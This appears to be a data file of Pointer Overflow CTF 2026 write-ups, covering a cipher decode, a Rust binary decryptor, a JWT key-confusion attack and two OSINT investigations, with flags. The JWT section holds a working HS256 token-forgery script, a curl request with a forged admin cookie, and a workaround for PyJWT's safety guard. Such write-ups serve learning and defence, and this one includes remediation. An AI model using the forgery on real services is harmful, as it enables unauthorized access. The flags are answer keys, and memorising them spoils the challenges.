        text: "Notes below 65 are the digits. Two observations fix the mapping:\n\n• The 26-character last segment is base32-like, and its low notes only ever take the values 55–60, which is six symbols, matching base32's digits 2–7.\n• The second number uses notes 56 60 57. The sample's second number is 374. With 55 = '2', 56 = '3', 60 = '7', 57 = '4', this gives 3 7 4. ✔\n\nSo note = 55 + (digit - 2) for digits 2…9. The full alphabet is:\n\nNotes 55–62 → 2 3 4 5 6 7 8 9\nNote 63 → .\nNote 64 → {\nNotes 65–90 → A … Z\nNote 91 → }\n\nThat is 8 + 1 + 1 + 26 + 1 = 37 symbols. (Notes 61 and 62 would be 8 and 9, which don't occur in this score.)"
      },
      {
        type: 'heading',
        text: '7. Step 6: Decode'
      },
      {
        type: 'code',
        code: `S = '23456789.{ABCDEFGHIJKLMNOPQRSTUVWXYZ}'
print(''.join(S[n - 55] for n in notes))`
      },
      {
        type: 'paragraph',
        text: 'Output:'
      },
      {
        type: 'code',
        code: `POCTF{74.374.FXOEANPCJP3WNRK4.725GFATAH3PXBZ23AHE55K3FS6}`
      },
      {
        type: 'heading',
        text: '8. Caveats'
      },
      {
        type: 'paragraph',
        text: '• The first number decodes to 74, while the challenge sample shows 94. The sample values are placeholders, and the platform confirmed the decoded flag is correct.\n• The 16-character middle segment is not hex, unlike the sample. It uses the same alphabet as the last segment.\n• Only the structure of the sample flag format and the POCTF crib were needed. The "journal" was never required.'
      },
      {
        type: 'heading',
        text: '9. Takeaways'
      },
      {
        type: 'paragraph',
        text: '• A "known plaintext" crib that decodes to itself means the key is zero. Check for a plain substitution before trying keyed ciphers.\n• Compare repeated symbols against the flag format\'s fixed characters (here, the dots). The three dot positions gave away the whole structure.\n• Check the range of values (55–91 is 37 values) to guess the alphabet size.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-the-oxidized-archive',
    slug: 'pointer-overflow-ctf-2026-the-oxidized-archive',
    title: 'Pointer Overflow CTF 2026 - The Oxidized Archive',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Reverse Engineering',
    difficulty: '100 pts • Wave 6',
    date: 'November 2026',
    readTime: '6 min read',
    os: 'Linux ELF x86-64 (Stripped Rust)',
    osLabel: 'BINARY FORMAT',
    ip: 'Offline / archive-374.zip',
    ipLabel: 'ENVIRONMENT',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Reverse Engineering', 'Rust', 'ELF', 'LCG', 'FNV-1a', 'XOR', 'Python', 'objdump', 'Disassembly'],
    excerpt: 'Reverse engineering a stripped x86-64 Rust ELF binary to extract embedded ciphertext and key from .rodata, defeating a broken non-cryptographic Knuth MMIX LCG keystream and bypassing an unnecessary token check.',
    userFlag: 'POCTF{122.374.56631a4375bff29c.B33DKOTJI3NTONVTJE3GNW2MK4}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Summary'
      },
      {
        type: 'paragraph',
        text: 'The binary is a stripped Rust ELF that expects an access token. The encrypted archive (128 bytes) and the key that unlocks it are both stored in .rodata. The "encryption" is a plain XOR with a keystream produced by a non-cryptographic LCG, seeded by an FNV-1a hash of the embedded key. The token check is never needed: the key is already in the file, so the archive can be decrypted offline.'
      },
      {
        type: 'file',
        src: '/assets/archive-374.zip',
        filename: 'archive-374.zip',
        label: 'Download archive-374.zip (Challenge Binary & Artifacts)',
        caption: 'Challenge Package: archive-374.zip (oxidized_archive + README.txt)'
      },
      {
        type: 'heading',
        text: '2. Step 1: Unpack and Triage'
      },
      {
        type: 'code',
        code: `unzip archive-374.zip
file oxidized_archive
./oxidized_archive`
      },
      {
        type: 'paragraph',
        text: '• file shows a stripped x86-64 PIE ELF (Rust).\n• Running it prints usage: ./oxidized_archive <access-token>, so it needs an argument.\n• README.txt only says "The archive is sealed. Make it talk."'
      },
      {
        type: 'heading',
        text: '3. Step 2: Look at Strings'
      },
      {
        type: 'code',
        code: `strings -t x -n 4 oxidized_archive | grep -E "usage|archive sealed"`
      },
      {
        type: 'paragraph',
        text: 'Useful strings: usage: at 0x6639 and archive sealed. supplied token does not match. at 0x6bc1. The second one is the failure path, so whatever code references it is the token check.'
      },
      {
        type: 'heading',
        text: '4. Step 3: Find the Code That Uses Them'
      },
      {
        type: 'paragraph',
        text: 'The binary is stripped, so I disassembled everything and searched for RIP-relative references to those addresses:'
      },
      {
        type: 'code',
        code: `objdump -d -M intel --no-show-raw-insn oxidized_archive > d.txt
grep -n -E "# (6639|6bc1)" d.txt`
      },
      {
        type: 'paragraph',
        text: 'The reference to 0x6bc1 sits at 0x15e81, inside the big routine that is the real main. The .rodata section starts at 0x5480, and its file offset equals its virtual address, which makes reading raw bytes easy.'
      },
      {
        type: 'heading',
        text: '5. Step 4: Understand the Token Check (0x159b9–0x15aa3)'
      },
      {
        type: 'paragraph',
        text: '1. It checks that exactly one argument was given (otherwise the usage message).\n2. It hashes the argument with FNV-1a 64-bit: offset basis 0xcbf29ce484222325, prime 0x100000001b3, i.e. h = (h ^ byte) * prime.\n3. It compares the hash to a value stored behind a pointer. If different, it prints "archive sealed..." and exits with code 1.\n\nThe check only compares a hash, so recovering the token would mean inverting FNV. That is unnecessary, because the decryption code does not use the token.'
      },
      {
        type: 'heading',
        text: '6. Step 5: Understand the Decryption (0x15aa9–0x16116)'
      },
      {
        type: 'paragraph',
        text: 'On the success path the code does three things:\n\na) Copies two blobs from .rodata to the stack:\n• 128 bytes from 0x5480 to 0x54ff: the ciphertext (the "archive").\n• 32 bytes from 0x5500 to 0x551f: the key.\n\nb) Hashes the key (FNV-1a again) into a seed:\nThe code scans the 32-byte key for its first 0x00 byte and hashes only the bytes before it. Here the key is 23 bytes, followed by NUL padding. Note that the token and the key are separate things: the key is the 32-byte blob, not the argument.\n\nc) Generates a 128-byte keystream with an LCG, then XORs:\nThe constants 0x5851f42d4c957f2d and 0x14057b7ef767814f are Knuth\'s MMIX LCG multiplier and increment. Per output byte:\n  state = state * 0x5851f42d4c957f2d + 0x14057b7ef767814f   (mod 2^64)\n  byte  = (state >> 33) & 0xff\n\nThe loop is at 0x15fb0–0x15fd6 and fills a 0x80-byte heap buffer. A second loop (0x16035–0x160c2, SSE xorps) XORs the keystream with the ciphertext. Finally the code finds the first NUL byte in the result and prints that many bytes.'
      },
      {
        type: 'heading',
        text: '7. Step 6: Why It Prints Nothing in Practice'
      },
      {
        type: 'paragraph',
        text: 'Without the right token the program exits at the "sealed" message. The token hash is only a gate, and everything needed for decryption is statically embedded, which is what the challenge text means by "the author\'s crypto was not actually crypto".'
      },
      {
        type: 'heading',
        text: '8. Step 7: Decrypt Offline (Python Exploit)'
      },
      {
        type: 'paragraph',
        text: 'Extract the blobs from the file at 0x5480 and 0x5500, replicate the algorithm:'
      },
      {
        type: 'code',
        code: `d = open('oxidized_archive','rb').read()
arc = d[0x5480:0x5500]          # 128-byte ciphertext
key = d[0x5500:0x5520]          # 32-byte key blob
k = key.split(b'\\0')[0]         # up to first NUL

M = (1 << 64) - 1
h = 0xcbf29ce484222325          # FNV-1a 64
for b in k:
    h = ((h ^ b) * 0x100000001b3) & M

ks, s = bytearray(), h
for _ in range(128):
    s = (s * 0x5851f42d4c957f2d + 0x14057b7ef767814f) & M
    ks.append((s >> 33) & 0xff)

pt = bytes(a ^ b for a, b in zip(arc, ks))
print(pt.split(b'\\0')[0].decode())`
      },
      {
        type: 'paragraph',
        text: 'Output:'
      },
      {
        type: 'code',
        code: `POCTF{122.374.56631a4375bff29c.B33DKOTJI3NTONVTJE3GNW2MK4}`
      },
      {
        type: 'heading',
        text: '9. Key Takeaways'
      },
      {
        type: 'paragraph',
        text: '• Key and ciphertext shipped in the same binary means the encryption offers no secrecy.\n• An XOR keystream from a linear congruential generator is not cryptographically secure, and here its seed is also fully known.\n• The token check was a distraction: the guard compared a hash, but decryption never depended on the token.\n• Finding the real logic in a stripped Rust binary is easiest by anchoring on string references (usage, the error message) and well-known constants (FNV offset/prime, MMIX LCG multiplier).'
      },
      {
        type: 'heading',
        text: '10. Tools Used'
      },
      {
        type: 'paragraph',
        text: 'unzip, file, strings, objdump -d -M intel, grep, Python 3. No dynamic analysis or debugger was needed.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-the-apparatus-levitation',
    slug: 'pointer-overflow-ctf-2026-the-apparatus-levitation',
    title: 'Pointer Overflow CTF 2026 - The Apparatus, Levitation',
    platform: 'Pointer Overflow CTF 2026',
    category: 'Web',
    difficulty: '100 pts • Wave 5',
    date: 'November 2026',
    readTime: '8 min read',
    os: 'Node.js / JWT (RS256 / HS256)',
    osLabel: 'TARGET TECH',
    ip: 'https://levitation.pointeroverflowctf.com',
    ipLabel: 'TARGET URL',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'Web Exploitation', 'JWT', 'RS256 to HS256', 'Key Confusion', 'Cryptography', 'Privilege Escalation', 'Python', 'curl', 'DevTools'],
    excerpt: 'Exploiting an unpinned JWT verification algorithm on the Liminal Society session portal to execute a classic RS256 to HS256 key-confusion attack, forging a high-privilege SPIRIT token using the public RSA key as the HMAC secret.',
    userFlag: 'POCTF{80.374.TPMJ7JRZWBTJA5W2.KGE7BJAZJUNYPULDXWOBNFJZ7P}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Summary'
      },
      {
        type: 'paragraph',
        text: 'The Liminal Society for Spectral Fellowship (LSSF) session portal issues JWT session cookies signed with RS256, and publishes the corresponding RSA public key at /spirit-key.pem and /.well-known/jwks.json "for verification." The server\'s JWT verification accepted multiple algorithms without pinning alg to RS256, which allowed a classic RS256 → HS256 key-confusion attack: using the public key\'s raw bytes as an HMAC secret to self-sign a forged token with an elevated role.'
      },
      {
        type: 'file',
        src: '/assets/spirit-key.pem',
        filename: 'spirit-key.pem',
        label: 'Download spirit-key.pem (Target RSA Public Key)',
        caption: 'Target RSA 2048-bit Public Key recovered from /spirit-key.pem'
      },
      {
        type: 'heading',
        text: '2. Reconnaissance & Challenge Brief'
      },
      {
        type: 'paragraph',
        text: 'The challenge brief describes a private parlour portal where mediums attend recorded sittings:\n\n"The Liminal Society for Spectral Fellowship maintains a private parlour portal at levitation.pointeroverflowctf.com where mediums may attend recorded sittings.\n\nPresent your team\'s session token, open a MEDIUM-role session, and attempt to access the SPIRIT-only transcripts. The token you use is issued below, expiring fifteen minutes after this page loads.\n\nOnly SPIRIT-role subscribers may recover the marker embedded in the transcript. MEDIUMS may read only their own attendance record.\n\nIssued team token:\nLEVIT2.374.80.1793584872.OUGQXJQIS4VJCL77Z2ASDYYDVY"'
      },
      {
        type: 'heading',
        text: '3. Opening a MEDIUM Session'
      },
      {
        type: 'paragraph',
        text: 'Submitting the team token at https://levitation.pointeroverflowctf.com/parlour initialized a session with role: MEDIUM:\n\nThe Parlour\nSession open. Team `374`. Present role: `MEDIUM`.\n\nMEDIUMS may attend the sitting and record what they perceive. SPIRITS, if any answer, may access the transcripts of prior sessions.\n\n[View available transcripts →] https://levitation.pointeroverflowctf.com/api/transcript\n\nCalling that endpoint as a MEDIUM returned only an unprivileged placeholder:'
      },
      {
        type: 'code',
        code: `// GET /api/transcript (Role: MEDIUM)
{
  "ok": true,
  "role": "medium",
  "transcript": [
    "The medium attends the sitting.",
    "No spirit presence has been recorded on this line.",
    "Only SPIRIT-role subscribers may access session recordings."
  ]
}`
      },
      {
        type: 'heading',
        text: '4. Public Key Material & JWKS Discovery'
      },
      {
        type: 'paragraph',
        text: 'The portal advertises its signing key as a "public register" at two well-known locations:\n• /.well-known/jwks.json\n• /spirit-key.pem\n\nJWKS response:'
      },
      {
        type: 'code',
        code: `{
  "keys": [
    {
      "alg": "RS256",
      "e": "AQAB",
      "kid": "spirit-key-1",
      "kty": "RSA",
      "n": "kEsG8XT5FasM7Ose-aHWrXnDI6sBRpETu6CdF2DFkwi3LY4NQaz0s8PuI1bxPM58QDmn_qwpphuM0Kl3HeBRAj6GqjBij4bv0eOjVbEmQPYgDRZzyl-IsCW5Y4RgxTOiMG_KLz9kQbxqUh0lzgDq85Ru5j8-jLxFcpBC0b0vLTmgS7PIGPdPF2_nrNhk6FTMkZ6DZmgXaQCCU1FCw5B859a326N1wT9oceID4AJWTPSgH7-NPphREX3ayzFSRCwEj-wV_XzBAR7bk1degpyywrl1PLrlUKCP5JWAVeUTLHdi0JUQC2APGYHR2i1sLYaczbqoECdo65fJ1JaaBqagJQ",
      "use": "sig"
    }
  ]
}`
      },
      {
        type: 'paragraph',
        text: 'Matching raw PEM (spirit-key.pem), 2048-bit RSA public key:'
      },
      {
        type: 'code',
        code: `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkEsG8XT5FasM7Ose+aHW
rXnDI6sBRpETu6CdF2DFkwi3LY4NQaz0s8PuI1bxPM58QDmn/qwpphuM0Kl3HeBR
Aj6GqjBij4bv0eOjVbEmQPYgDRZzyl+IsCW5Y4RgxTOiMG/KLz9kQbxqUh0lzgDq
85Ru5j8+jLxFcpBC0b0vLTmgS7PIGPdPF2/nrNhk6FTMkZ6DZmgXaQCCU1FCw5B8
59a326N1wT9oceID4AJWTPSgH7+NPphREX3ayzFSRCwEj+wV/XzBAR7bk1degpyy
wrl1PLrlUKCP5JWAVeUTLHdi0JUQC2APGYHR2i1sLYaczbqoECdo65fJ1JaaBqag
JQIDAQAB
-----END PUBLIC KEY-----`
      },
      {
        type: 'heading',
        text: '5. Identifying the HttpOnly Session Cookie'
      },
      {
        type: 'paragraph',
        text: 'The session was stored in an HttpOnly cookie (inaccessible via document.cookie), discovered using Chrome DevTools (Application → Storage → Cookies → https://levitation.pointeroverflowctf.com):\n\n• Cookie Name: levitation_session\n• HttpOnly: true\n• SameSite: Lax\n• Path: /\n\nReal session cookie token payload inspection:'
      },
      {
        type: 'code',
        code: `// Decoded Token Header
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "spirit-key-1"
}

// Decoded Token Payload
{
  "team_id": 374,
  "nonce": "TPMJ7JRZWBTJA5W2",
  "role": "medium",
  "iat": 1793584338,
  "exp": 1793598738
}`
      },
      {
        type: 'paragraph',
        text: 'The kid matches the published JWKS entry, and the key the server uses to verify this token is exactly the public PEM served at /spirit-key.pem. Because asymmetric RS256 is expected, publishing the public key is normal — but without algorithm pinning, it becomes an attack vector.'
      },
      {
        type: 'heading',
        text: '6. The Vulnerability: RS256 to HS256 Key Confusion'
      },
      {
        type: 'paragraph',
        text: 'Many JWT verification libraries take a single generic key parameter and determine how to interpret that key based on the header alg claim in the untrusted token:\n\njwt.verify(token, publicKeyPem); // Vulnerable: algorithms not pinned\n\nWhen the token specifies alg: "HS256", the library treats the public key string itself as a symmetric HMAC secret. Because the RSA public key is known publicly, anyone can forge tokens and sign them using HMAC-SHA256 with the public key as the secret.'
      },
      {
        type: 'heading',
        text: '7. Exploit: Attempt 1 — PyJWT Built-in Safety Guard'
      },
      {
        type: 'paragraph',
        text: 'Initial attempt using PyJWT to encode the token:'
      },
      {
        type: 'code',
        code: `import jwt

with open("spirit-key.pem", "rb") as f:
    pubkey_pem = f.read()

payload = {"role": "spirit", "team": "374"}
forged = jwt.encode(payload, pubkey_pem, algorithm="HS256")
print(forged)`
      },
      {
        type: 'paragraph',
        text: 'Result:'
      },
      {
        type: 'code',
        code: `$ python3 forgepoctf.py
Traceback (most recent call last):
  File "/home/kali/forgepoctf.py", line 11, in <module>
    forged = jwt.encode(payload, pubkey_pem, algorithm="HS256")
  ...
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`
      },
      {
        type: 'paragraph',
        text: 'Modern PyJWT (2.10.1) explicitly detects PEM headers and blocks using asymmetric keys as HMAC secrets. To bypass this client-side protection, we must compute the HMAC signature directly using standard Python libraries (hmac and hashlib).'
      },
      {
        type: 'heading',
        text: '8. Exploit: Attempt 2 — Hand-rolled HS256 & Claim Mismatch'
      },
      {
        type: 'paragraph',
        text: 'Constructing the token manually with standard libraries, but with guessed claim names and using Authorization: Bearer:'
      },
      {
        type: 'code',
        code: `import json, base64, hmac, hashlib

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

with open("spirit-key.pem", "rb") as f:
    secret = f.read()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"role": "spirit", "team": "374"}   # guessed claim names

header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{header_b64}.{payload_b64}".encode()
sig_b64 = b64url(hmac.new(secret, signing_input, hashlib.sha256).digest())
print(f"{header_b64}.{payload_b64}.{sig_b64}")`
      },
      {
        type: 'paragraph',
        text: 'Sending via curl returned {"message":"No valid session.","ok":false}. Diagnosis:\n1. Claim names (team vs team_id, missing nonce/iat/exp) did not match the backend schema.\n2. The application expects the session in a cookie, not an Authorization header.'
      },
      {
        type: 'heading',
        text: '9. Exploit: Attempt 3 — Exact Schema & Cookie Name Discovery'
      },
      {
        type: 'paragraph',
        text: 'Updating claims to mirror the legitimate session token structure with kid: spirit-key-1, team_id, and nonce:'
      },
      {
        type: 'code',
        code: `header = {"alg": "HS256", "typ": "JWT", "kid": "spirit-key-1"}
payload = {
    "team_id": 374,
    "nonce": "TPMJ7JRZWBTJA5W2",
    "role": "spirit",
    "iat": 1793584338,
    "exp": 1793598738
}`
      },
      {
        type: 'paragraph',
        text: 'Initial request with guessed cookie name session failed. Inspecting DevTools cookies revealed the exact name is levitation_session.'
      },
      {
        type: 'heading',
        text: '10. Exploit: Attempt 4 — Successful Escalation & Flag Recovery'
      },
      {
        type: 'paragraph',
        text: 'Sending the forged token in the levitation_session cookie:'
      },
      {
        type: 'code',
        code: `$ curl -b "levitation_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNwaXJpdC1rZXktMSJ9.eyJ0ZWFtX2lkIjozNzQsIm5vbmNlIjoiVFBNSjdKUlpXQlRKQTVXMiIsInJvbGUiOiJzcGlyaXQiLCJpYXQiOjE3OTM1ODQzMzgsImV4cCI6MTc5MzU5ODczOH0.anqvrHntA85yFqyoyTz8286NxbvCNXInS0m_yv0Pes8" \\
       https://levitation.pointeroverflowctf.com/api/transcript`
      },
      {
        type: 'paragraph',
        text: 'Server response with flag:'
      },
      {
        type: 'code',
        code: `{
  "ok": true,
  "role": "spirit",
  "transcript": [
    "The apparatus recognises the presence.",
    "Session record follows.",
    "Speak, and be heard. Speak, and be not commanded.",
    "Recovered marker: POCTF{80.374.TPMJ7JRZWBTJA5W2.KGE7BJAZJUNYPULDXWOBNFJZ7P}"
  ]
}`
      },
      {
        type: 'heading',
        text: '11. Root Cause & Remediation'
      },
      {
        type: 'paragraph',
        text: '• Root Cause: The server verification failed to pin allowed algorithms ({ algorithms: ["RS256"] }). This enabled an attacker-controlled header to shift verification mode from asymmetric to symmetric, turning the public key into an HMAC secret.\n\n• Remediation: Explicitly whitelist expected algorithms during verification (e.g., jwt.verify(token, publicKey, { algorithms: ["RS256"] })), reject any token specifying symmetric algorithms against an RSA key, and ensure kid lookups validate key type matching.'
      },
      {
        type: 'heading',
        text: '12. Final Working Exploit Script'
      },
      {
        type: 'code',
        code: `import json, base64, hmac, hashlib

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

with open("spirit-key.pem", "rb") as f:
    secret = f.read()          # public key bytes used directly as HMAC secret

header = {"alg": "HS256", "typ": "JWT", "kid": "spirit-key-1"}
payload = {
    "team_id": 374,
    "nonce": "TPMJ7JRZWBTJA5W2",
    "role": "spirit",          # privilege escalation: medium -> spirit
    "iat": 1793584338,
    "exp": 1793598738
}

h = b64url(json.dumps(header,  separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()

print(f"{h}.{p}.{b64url(sig)}")`
      },
      {
        type: 'heading',
        text: '13. Tools Used'
      },
      {
        type: 'paragraph',
        text: '• Chrome DevTools: Application → Cookies inspection to extract HttpOnly session cookie name and session parameters.\n• curl: Session probing and authenticated API requests.\n• Python 3 (hmac, hashlib, base64, json): Hand-crafted HS256 HMAC signature calculation bypassing PyJWT safety controls.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-the-preserved-moment',
    slug: 'pointer-overflow-ctf-2026-the-preserved-moment',
    title: 'Pointer Overflow CTF 2026 - The Preserved Moment',
    platform: 'Pointer Overflow CTF 2026',
    category: 'OSINT',
    difficulty: '100 pts • Wave 5',
    date: 'November 2026',
    readTime: '5 min read',
    os: 'Wayback Machine / DNS / Web Archives',
    osLabel: 'INVESTIGATION TECH',
    ip: 'tadychseconofoods.com / econotnc.com',
    ipLabel: 'TARGET DOMAINS',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'OSINT', 'Wayback Machine', 'Web Archive', 'DNS', 'Digital Forensics', 'Domain Recon'],
    excerpt: 'Tracking down a historical 2008 grocery store menu through historical domain footprints and email contact records in the Wayback Machine, overcoming DNS NXDOMAIN filtering.',
    userFlag: 'POCTF{94.374.11c72357d8427203.RDDXGZFRDZWQGHKB4WOVVD5PR6}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. Challenge'
      },
      {
        type: 'paragraph',
        text: 'Find the third item on offer on Sunday, March 30, 2008 at the Econo Foods store in Sturgeon Bay. The prompt hints that the chain splintered into stores with different owners and several web domains over the years, so the answer sits in the web archive.'
      },
      {
        type: 'file',
        src: '/assets/the-preserved-moment-osint.docx',
        filename: 'the-preserved-moment-osint.docx',
        label: 'Download the-preserved-moment-osint.docx (Original Writeup Document)',
        caption: 'Challenge writeup document and evidence notes'
      },
      {
        type: 'heading',
        text: '2. Identifying the Store'
      },
      {
        type: 'table',
        headers: ['Property', 'Details'],
        rows: [
          ['Address', '1250 N 14th Ave, Sturgeon Bay, WI 54235'],
          ['Operating name', "Tadych's Econofoods"],
          ['Parent company', 'T&C Markets (Brillion, WI)'],
          ['Current website', 'tadychseconofoods.com'],
          ['Contact email', 'sturgeonbay@econotnc.com']
        ]
      },
      {
        type: 'paragraph',
        text: 'Directory listings (Door County Pulse, Nextdoor, Door County Style) gave these details. The email domain, econotnc.com, differs from the website domain, and that mismatch became the lead.'
      },
      {
        type: 'heading',
        text: '3. Dead End: The Current Domain'
      },
      {
        type: 'paragraph',
        text: 'I searched tadychseconofoods.com in the Wayback Machine. The first capture is November 18, 2011, and the 2008 calendar is empty.'
      },
      {
        type: 'image',
        src: '/assets/poctf-preserved-moment-fig1.png',
        alt: 'Figure 1: Wayback calendar for tadychseconofoods.com',
        caption: 'Figure 1: Wayback calendar for tadychseconofoods.com. Saved 274 times between Nov 18, 2011 and May 13, 2026; no 2008 captures.'
      },
      {
        type: 'heading',
        text: '4. Finding the 2008 Domain'
      },
      {
        type: 'paragraph',
        text: 'The email address uses econotnc.com. "TNC" matches T&C Markets, the parent company.\n\nCompanies often keep an older domain for email after the website moves, so it was a strong candidate for the 2008 site.\n\nThe Wayback Machine has captures of econotnc.com back to 2001, including one on the exact date in the question.'
      },
      {
        type: 'image',
        src: '/assets/poctf-preserved-moment-fig2.png',
        alt: 'Figure 2: Wayback calendar for econotnc.com, 2008',
        caption: 'Figure 2: Wayback calendar for econotnc.com, 2008. The popup shows one snapshot on March 30, 2008 at 06:57:54.'
      },
      {
        type: 'heading',
        text: '5. Reading the Archived Page'
      },
      {
        type: 'paragraph',
        text: 'Opened the 06:57:54 snapshot from the popup.\n\nFollowed the link to the Sturgeon Bay store (the site covered several T&C Markets stores).\n\nFound the Sunday, March 30 entry and read the items in order.\n\nThird item: SWEDISH MEATBALLS\n\nNote: a screenshot of the archived Sunday menu was not available when this file was made.'
      },
      {
        type: 'code',
        code: `POCTF{94.374.11c72357d8427203.RDDXGZFRDZWQGHKB4WOVVD5PR6}`
      },
      {
        type: 'heading',
        text: '6. Troubleshooting'
      },
      {
        type: 'paragraph',
        text: 'The Wayback Machine initially would not load and Chrome showed a DNS error. This was a network-level block on the domain, not a typo. Enabling secure DNS in Brave fixed it.'
      },
      {
        type: 'image',
        src: '/assets/poctf-preserved-moment-fig3.png',
        alt: 'Figure 3: Chrome error DNS_PROBE_FINISHED_NXDOMAIN for web.archive.org',
        caption: 'Figure 3: Chrome error DNS_PROBE_FINISHED_NXDOMAIN for web.archive.org.'
      },
      {
        type: 'heading',
        text: '7. Lessons Learned'
      },
      {
        type: 'paragraph',
        text: '• The current website is not the historical one. If the archive calendar is empty for the target year, look for earlier domains.\n• Contact details leak history. A mismatched email domain pointed to the old parent-company site.\n• Read the Wayback banner first. "Saved X times between..." shows whether a domain existed in the target year.\n• Calendar popups show exact timestamps, which confirmed the March 30, 2008 capture before opening it.\n• Many search results for the brand were AI-generated spam. Directories and company pages were reliable.'
      },
      {
        type: 'heading',
        text: '8. Tools'
      },
      {
        type: 'paragraph',
        text: 'Wayback Machine (web.archive.org), business directories, Brave with secure DNS.'
      }
    ]
  },
  {
    id: 'pointer-overflow-ctf-2026-a-shipwreck',
    slug: 'pointer-overflow-ctf-2026-a-shipwreck',
    title: 'Pointer Overflow CTF 2026 - A Shipwreck',
    platform: 'Pointer Overflow CTF 2026',
    category: 'OSINT',
    difficulty: 'Medium',
    date: 'November 2026',
    readTime: '6 min read',
    os: 'Satellite Imagery / Maritime OSINT',
    osLabel: 'INVESTIGATION METHOD',
    ip: 'Tutóia, Maranhão, Brazil',
    ipLabel: 'LOCATION IDENTIFIED',
    status: 'Solved',
    tags: ['Pointer Overflow CTF 2026', 'OSINT', 'Geolocation', 'Satellite Imagery', 'Maritime History', 'Brazil', 'Google Earth', 'Shipwreck'],
    excerpt: 'Identifying an abandoned coastal shipwreck from a Google satellite tile by analyzing architectural roofing patterns, estuarine water dynamics, and coastal geography along northeast Brazil, solving Pointer Overflow CTF 2026 with grounding time 19:40 and flag POCTF{96.374.263cde26c28dcfbc.M4A2Y5KRQIE7IDQAGQHNKKTXDB}.',
    userFlag: 'POCTF{96.374.263cde26c28dcfbc.M4A2Y5KRQIE7IDQAGQHNKKTXDB}',
    userFlagLabel: 'FLAG',
    rootFlag: null,
    content: [
      {
        type: 'heading',
        text: '1. The Challenge'
      },
      {
        type: 'paragraph',
        text: 'The prompt gives a satellite image and a story about a retired ship ("retirement was much less kind to the old lady"). The task is to find the ship, learn its history and answer questions about it.\n\n• Challenge question: At what time did the ship run aground?\n• Answer: about 19:40 (7:40 PM), on 16 November 1981.\n• Confidence: verified via challenge portal with official flag marker.'
      },
      {
        type: 'image',
        src: '/assets/osint-the-shipwreck.jpg',
        alt: 'Satellite image of coastal town with abandoned shipwreck offshore',
        caption: 'Challenge satellite tile: Coastal town on a sandy spit with orange clay roofs and an offshore rusted vessel'
      },
      {
        type: 'heading',
        text: '2. What the Image Shows'
      },
      {
        type: 'paragraph',
        text: 'The image is a Google satellite tile (watermarked "2026 Google") with key geographical and visual features:\n\n• A town of dense orange clay-tile roofs on a curved sandy spit, with a wide pale beach along the water.\n• Muddy, sediment-laden brown-green water, typical of a river mouth or delta.\n• Small fishing boats scattered near the shoreline.\n• A single rusted vessel with a reddish deck sitting in the water roughly a kilometre offshore, apparently stationary and abandoned.'
      },
      {
        type: 'heading',
        text: '3. Narrowing the Location'
      },
      {
        type: 'paragraph',
        text: 'The clues point to the northeast coast of Brazil:\n\n• Roofs and street layout: orange tile roofs and the grid of a small coastal town are typical of Brazilian towns.\n• Water colour: the heavy sediment suggests a large river estuary, which fits the Pará and Maranhão coast.\n• Wreck type: an old, rusting cargo hull left in shallow water.\n\nSearching for abandoned and stranded wrecks off beach towns in Pará, Maranhão and Ceará ruled out several candidate wrecks:'
      },
      {
        type: 'table',
        headers: ['Candidate', 'Why it was rejected'],
        rows: [
          ['Stellar Banner (Maranhão, 2020)', 'Scuttled in deep water in 2020; not visible near a beach'],
          ['Haidar (Barcarena, Pará, 2015)', 'Capsized livestock carrier, not an upright hull'],
          ['Mara Hope (Fortaleza)', 'Tanker on a sandbar beside a large city; mostly dismantled'],
          ['Kestrel (Santos)', 'A buried 19th-century sailing ship'],
          ['Vapor São Paulo (Guaratuba)', 'A buried 19th-century steamer']
        ]
      },
      {
        type: 'paragraph',
        text: 'A Portuguese-language search surfaced a long-stranded ship at Tutóia, Maranhão, a town at the edge of the Parnaíba Delta. It is a tourist attraction because it is visible offshore, which fits the challenge image precisely.'
      },
      {
        type: 'heading',
        text: '4. The Ship: Aline Ramos'
      },
      {
        type: 'paragraph',
        text: 'The wreck at Tutóia is the Aline Ramos, also referred to as "Barão do Amazonas".\n\n• Launched: August 1963.\n• Type: a cargo ship; local accounts say it was carrying salt.\n• Grounding: it ran aground at the point of Ilha do Caju, near the entrance of the Barra do Carrapato, on 16 November 1981, around 19:40.\n• Crew: 17 people were aboard, including the master (a capitão-de-cabotagem, named Gomes), the first mate (Tenório), a second pilot, engineers and deckhands.\n• Aftermath: a bureaucratic dispute with the insurers followed. The ship was towed close to the beach at Barra de Tutóia, where it remains.\n• Today: the hull was looted early on and is now corroded and rusted. At low tide it is fully exposed and acts as an artificial breakwater. Local legends say large fish live in it, and it is a regular stop on boat tours of the delta.\n• Recent news: in July 2026 a canoe accident near the wreck killed two people, and local media describe the wreck as a well-known landmark.'
      },
      {
        type: 'heading',
        text: '5. Answer to the Question'
      },
      {
        type: 'paragraph',
        text: 'The Aline Ramos ran aground at about 19:40 on 16 November 1981. Submitting 19:40 into the challenge portal verified the grounding time and generated the official solve flag marker:'
      },
      {
        type: 'code',
        code: `POCTF{96.374.263cde26c28dcfbc.M4A2Y5KRQIE7IDQAGQHNKKTXDB}`
      },
